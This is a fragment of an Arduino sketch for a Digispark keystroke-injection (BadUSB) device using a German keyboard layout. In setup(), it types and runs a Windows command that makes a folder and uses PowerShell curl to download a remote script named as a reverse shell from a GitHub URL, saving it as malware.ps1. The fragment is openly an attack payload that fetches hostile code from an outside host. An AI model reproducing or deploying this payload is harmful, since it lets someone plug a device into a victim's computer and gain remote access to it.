...
void setup() {
  ...
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell curl  'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Linux-Smart-Client-Side-Script-ReverseShell.ps1' -o malware.ps1");
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
